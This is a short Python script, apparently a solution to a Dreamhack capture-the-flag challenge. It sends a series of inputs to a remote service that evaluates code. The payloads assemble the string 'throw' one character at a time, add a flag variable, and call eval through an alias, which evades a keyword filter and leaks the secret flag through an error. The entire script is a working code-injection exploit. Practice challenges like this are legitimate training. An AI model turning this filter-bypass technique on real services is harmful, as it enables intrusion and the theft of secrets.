import requests

url = "http://host8.dreamhack.games:11268/"

payloads = '''
f=flag
v="t"
b="h"
v+=b;1
b="r"
v+=b;1
b="o"
v+=b;1
b="w"
v+=b;1
b="'"
v+=b;1
v+=f;1
b="'"
v+=b;1
e=eval
e(v)'''.strip().split("\n")

for payload in payloads:
    res = requests.post(url, data={ "input_str": payload })
    print(res.text)